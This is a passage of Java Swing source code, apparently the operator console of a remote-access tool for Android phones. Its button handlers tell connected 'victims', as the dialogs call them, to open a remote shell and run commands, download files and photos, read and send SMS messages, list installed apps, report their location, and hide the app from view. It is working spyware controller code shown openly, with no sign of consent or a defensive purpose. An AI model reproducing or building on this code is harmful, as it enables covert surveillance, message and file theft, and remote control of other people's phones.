                jLabel7.setText(sdk); 
            }
        }
    }//GEN-LAST:event_connectedListValueChanged

    private void btnGetShellActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGetShellActionPerformed
        EchoThread s = getSelected(); s.sendGetShell();
   /* //next code is to send direct commands and execute in the server but is better  the  current used method
        EchoThread s = getSelected();
        if(!s.sendGetShell()) JOptionPane.showMessageDialog(this, "Error starting shell", "Shell Error", JOptionPane.ERROR_MESSAGE);
        String command = inputTextShell.getText();
        if(  ! command.isEmpty() ){
           EchoThread  slct=getSelected(); slct.sendShellCommand(command);
        }
   */
    }//GEN-LAST:event_btnGetShellActionPerformed

    private void btnGetShellExecuteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGetShellExecuteActionPerformed
        String command = inputTextShell.getText();
        if( !command.isEmpty() ){
           EchoThread slct=getSelected();
           slct.sendShellCommand(command);
        }else{
       
        }
    }//GEN-LAST:event_btnGetShellExecuteActionPerformed
    
    private void btnExitShellActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnExitShellActionPerformed
       getSelected().exitShell();
    }//GEN-LAST:event_btnExitShellActionPerformed

    private void inputTextShellFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inputTextShellFocusGained
        inputTextShell.setText(" ");  inputTextShell.setText( inputTextShell.getText().replace(" ", "") );
    }//GEN-LAST:event_inputTextShellFocusGained

    private void inputTextShellFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inputTextShellFocusLost
        if(inputTextShell.getText().equals("")){ inputTextShell.setText("Write command here..."); }
    }//GEN-LAST:event_inputTextShellFocusLost

    private void btnDownloadThumbActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDownloadThumbActionPerformed
      ClientInfo client = getSelectedClient("");
      if(client.downloadPath != null && !client.downloadPath.equals("")) {
         EchoThread selected = getSelected();
         String fileAbsolute = txtDownloadThumb.getText();
         String[] parts1 = fileAbsolute.split("/");
         if ( //if possible file and not a dir..
            parts1[parts1.length-1].contains(".") ||  fileAbsolute.contains(".jpeg") ||
            fileAbsolute.contains(".jpg") || fileAbsolute.contains(".png") || fileAbsolute.contains(".webp")
            ){
               String parts2[] =  parts1[parts1.length-1].replace(".","-,_g_-").split("-,_g_-");
               if(parts2.length > 1) 
                  selected.sendDownloadThumb(fileAbsolute);
         }else{
            String dirs = getClientDirs(fileAbsolute); 
            String dirss[] = dirs.split("_ds-_"); 
            System.out.println(dirss );
            ArrayList<String> downloads = getClientDownloads();
            for (int i = 0; i < dirss.length; i++) {
               if(dirss[i].contains(".jpg") || dirss[i].contains(".jpeg") || dirss[i].contains(".png") ){
                  String thumbFileName = convertFileNameToThumbName(dirss[i]);
                  if(!dirss[i].isEmpty() && !downloads.contains( thumbFileName ) ){
                      System.out.println(dirss[i] );
                     selected.sendDownloadThumb(dirss[i]); 
                  } else{
                      System.out.println("EMPTY=" + dirss[i] );
                  }
                     
               }else{
                    System.out.println("EMPTY _ 2=" + dirss[i] );
               }
            }
         }
      }else{
         JOptionPane.showMessageDialog(this, "You have to get the directories first", "Connection Closed", JOptionPane.ERROR_MESSAGE);
      }
    }//GEN-LAST:event_btnDownloadThumbActionPerformed

    private void btnDownloadFileActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDownloadFileActionPerformed
      ClientInfo client = getSelectedClient("");
      if(client.downloadPath != null && !client.downloadPath.equals("")){
         String fileAbsolute = textDownloadFile.getText();
         EchoThread selected1 = getSelected();
         String[] parts1 = fileAbsolute.split("/");
         if( //if possible file and not a dir..
            parts1[parts1.length-1].contains(".") || fileAbsolute.contains(".exe") ||
            fileAbsolute.contains(".jpg") || fileAbsolute.contains(".png") || 
            fileAbsolute.contains(".mp3") || fileAbsolute.contains(".mp4") ||
            fileAbsolute.contains(".webp") || fileAbsolute.contains(".jpeg") ||
            fileAbsolute.contains(".mov")  || fileAbsolute.contains(".3gp") ||
            fileAbsolute.contains(".txt") || fileAbsolute.contains(".csv") ||
            fileAbsolute.contains(".doc") ||  fileAbsolute.contains(".pdf") 
            ){
               String parts2[] =  parts1[parts1.length-1].replace(".","-,_g_-").split("-,_g_-");
               if(parts2.length > 1) 
                  selected1.sendDownloadFile(fileAbsolute);
         }else{
            String dirs = getClientDirs(fileAbsolute);
            String dirss[] = dirs.split("_ds-_");
            ArrayList<String> downloads = getClientDownloads();
            for (int i = 0; i < dirss.length; i++) if(!dirss[i].isEmpty() && !downloads.contains(dirss[i])) selected1.sendDownloadFile(dirss[i]);
         }
      }else{
          JOptionPane.showMessageDialog(this, "You have to get the directories first", "Connection Closed", JOptionPane.ERROR_MESSAGE);
      }      
    }//GEN-LAST:event_btnDownloadFileActionPerformed

    private void btnGetDirsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGetDirsActionPerformed
        selected = getSelected();
        try{
            if(selected.isOnline()){
                String sent = selected.sendGetDirs();
                if(sent != "sent"){
                    JOptionPane.showMessageDialog(this, "Error, check if victim is connected or not.", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }else{
                JOptionPane.showMessageDialog(this, "Victim is disconnected", "Connection Closed", JOptionPane.ERROR_MESSAGE);
                setOptionsToDisconnected();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }//GEN-LAST:event_btnGetDirsActionPerformed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        selected = getSelected();
        String number = textSmsNumber.getText().toString();
        String msj = textSmsMsg.getText().toString();
        if(!number.isEmpty()){
                try{
                    if(selected.isOnline()){
                        String sent = selected.sendSendSms(number,msj);
                        if(!sent.equals("sent")){
                            JOptionPane.showMessageDialog(this, "Error, check if victim is connected or not.", "Error", JOptionPane.ERROR_MESSAGE);
                        }
                    }else{
                        JOptionPane.showMessageDialog(this, "Victim is disconnected", "Connection Closed", JOptionPane.ERROR_MESSAGE);
                        setOptionsToDisconnected();
                    }
                }catch(Exception e){  e.printStackTrace(); }
        }else{
            JOptionPane.showMessageDialog(this, "Phone number can't be empty", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }//GEN-LAST:event_jButton2ActionPerformed

    private void btnGetSMSActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGetSMSActionPerformed
        selected = getSelected();
        if(selected.isOnline()){
            String type= selectSMS.getSelectedItem().toString();
            String getSMS = selected.getSMS(type);
            if( !getSMS.equals("sent")  && !getSMS.equals("closed") ){
                JOptionPane.showMessageDialog(this, "Error getting sms, please try again", "Error", JOptionPane.ERROR_MESSAGE);
            }else if(getSMS.equals("closed") ){
                JOptionPane.showMessageDialog(this, "Victim is disconnected", "Connection Closed", JOptionPane.ERROR_MESSAGE);
                setOptionsToDisconnected();
            }
        }else{
            JOptionPane.showMessageDialog(this, "Victim is disconnected", "Connection Closed", JOptionPane.ERROR_MESSAGE);
            setOptionsToDisconnected();
        }
    }//GEN-LAST:event_btnGetSMSActionPerformed

    private void btnGetAppsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGetAppsActionPerformed
        selected = getSelected();
        try{
            if(selected.isOnline()){
                String sent = selected.sendGetApps();
                if(!sent.equals("sent")){
                    JOptionPane.showMessageDialog(this, "Error, check if victim is connected or not.", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }else{
                JOptionPane.showMessageDialog(this, "Victim is disconnected", "Connection Closed", JOptionPane.ERROR_MESSAGE);
                setOptionsToDisconnected();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }//GEN-LAST:event_btnGetAppsActionPerformed
    
    public static ClientInfo getSelectedClient(String clientId)
    {
       if(clientId.equals("")){
         String cId = (String) connectedList_public.getSelectedValue();
         for(ClientInfo info : cInfoList) {
             if(info.id.equals(cId)){
                 return info;
             }
         }
       }else{
         for(ClientInfo info : cInfoList) {
             if(info.id.equals(clientId)){
                 return info;
             }
         }
       }

        return null;
        
        
        /*
        ArrayList[] ret = new ArrayList[]{};
        for(ClientInfo info : cInfoList) {
            if(id == info.id){
                return info;
            }
        }
        return null;*/
    }
    
    public static ArrayList<String> getClientDownloads()
    { 
        String clientId = (String) connectedList_public.getSelectedValue();
        for(ClientInfo info : cInfoList) {
            if(info.id.equals(clientId)){
                return info.downloadedFiles;
            }
        }
        return null;
    }
    public static String getClientDirs(String path)
    {
        String clientId = (String) connectedList_public.getSelectedValue();
        for(ClientInfo info : cInfoList) {
            if(info.id.equals(clientId)){
                System.out.println("info.dirs = " + info.dirs);
               String[] dirsAll = info.dirs.split("-_-,_-,-_-");
               if(!path.equals("")){
                    if(dirsAll.length > 0){
                        String returnDirs = "";
                         System.out.println("info.dirs 2 = " + dirsAll.length );
                         for (int i = 0; i < dirsAll.length; i++) {
                             String  currentDir = dirsAll[i].trim().split("_ds-_")[0].trim(); 
                             System.out.println("info.dirs 3 = " + dirsAll.length );
                             if(!currentDir.equals(path.trim()))  
                                continue;
                             String[] subDirs = dirsAll[i].split("_ds-_");
                             
                             for (int j = 0; j < subDirs.length; j++) {
                                 if( !subDirs[j].equals(currentDir) ){  
                                    returnDirs += currentDir+"/"+subDirs[j]+"_ds-_";
                                 }
                             }
                        }
                        return returnDirs;
                    }else{
                       return "empty_dirs";
                    }
               }
            }
        }
        return "";
    }
    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
      selected =getSelected();
      selected.sendGetLocation();
      /*
         //EchoThread selected = getSelected();
        //String v = connectedList.getSelectedValue();
        int i = 1;
        for (EchoThread c : clients) {
           System.out.println("ID_ => " + c.getID() );
           System.out.println("US_INFO_ => " + c.getUsInfo() );
           System.out.println("ONLINE_ => " + c.isOnline() );
           System.out.println("===============\n");
           i++;
        }
      */
        
    }//GEN-LAST:event_jButton3ActionPerformed

   private void txtDirsSavedInActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtDirsSavedInActionPerformed
      // TODO add your handling code here:
   }//GEN-LAST:event_txtDirsSavedInActionPerformed

   private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
     DefaultListModel listModel = (DefaultListModel) listUserApps.getModel();
        listModel.removeAllElements();
       listModel = (DefaultListModel) listSystemApps.getModel();
       listModel.removeAllElements();
   }//GEN-LAST:event_jButton6ActionPerformed

   private void jButton5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton5ActionPerformed
      jTree2.addTreeSelectionListener(new TreeSelectionListener() {              
         public void valueChanged(TreeSelectionEvent e) {
           valueSelected="";
            TreePath treepath = e.getPath();
            Object elements[] = treepath.getPath();
            for (int i = 0, n = elements.length; i < n; i++) {
               System.out.print("->" + elements[i]); 
               valueSelected+=elements[i]+pathType; 
            } 
            System.out.println(valueSelected);
         }
      });
   }//GEN-LAST:event_jButton5ActionPerformed

    private void jTextFieldGeolocActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldGeolocActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jTextFieldGeolocActionPerformed

    private void jButton7ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton7ActionPerformed
             selected =getSelected();selected.sendHideApp();
    }//GEN-LAST:event_jButton7ActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton btnDownloadFile;
    private javax.swing.JButton btnDownloadThumb;
    private javax.swing.JButton btnExitShell;
    private javax.swing.JButton btnGetApps;
    private javax.swing.JButton btnGetDirs;
    private javax.swing.JButton btnGetSMS;
    private javax.swing.JButton btnGetShell;
    private javax.swing.JButton btnGetShellExecute;
    private javax.swing.JButton btnStart;
    private javax.swing.JList<String> connectedList;
    private javax.swing.JTextField inputTextShell;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton5;
    private javax.swing.JButton jButton6;
    private javax.swing.JButton jButton7;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel10;
    private javax.swing.JLabel jLabel11;
    private javax.swing.JLabel jLabel12;
    private javax.swing.JLabel jLabel14;
    private javax.swing.JLabel jLabel15;
    private javax.swing.JLabel jLabel16;
    private javax.swing.JLabel jLabel17;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel10;
    private javax.swing.JPanel jPanel11;
    private javax.swing.JPanel jPanel12;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JPanel jPanel7;
    private javax.swing.JPanel jPanel8;
    private javax.swing.JPanel jPanel9;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JScrollPane jScrollPane6;
    private javax.swing.JTabbedPane jTabbedPane2;
    private javax.swing.JTabbedPane jTabbedPane3;
    private javax.swing.JTextField jTextField1;
    private javax.swing.JTextField jTextFieldGeoloc;
    private javax.swing.JTree jTree2;
    private javax.swing.JLabel labelDirsCaptured;
    private javax.swing.JLabel labelUsInfo1;
    private javax.swing.JLabel labelUsInfo_1;
    private javax.swing.JLabel labelUsInfo_3;
    private javax.swing.JLabel labelUsInfo_4;
    private javax.swing.JLabel labelUsInfo_5;
    private javax.swing.JList<String> listSystemApps;
    private javax.swing.JList<String> listUserApps;
    private javax.swing.JTextField selectDownloadFolder;
    private javax.swing.JComboBox<String> selectSMS;
    private javax.swing.JTabbedPane subTabSysApps;
    private javax.swing.JTextArea textAreaDebugInfo;
    private javax.swing.JTextField textDownloadFile;
    private javax.swing.JTextField textPort;
    private javax.swing.JTextField textSmsMsg;
    private javax.swing.JTextField textSmsNumber;
    private javax.swing.JTextField txtDirsSavedIn;
    private javax.swing.JTextField txtDownloadThumb;
    // End of variables declaration//GEN-END:variables
}

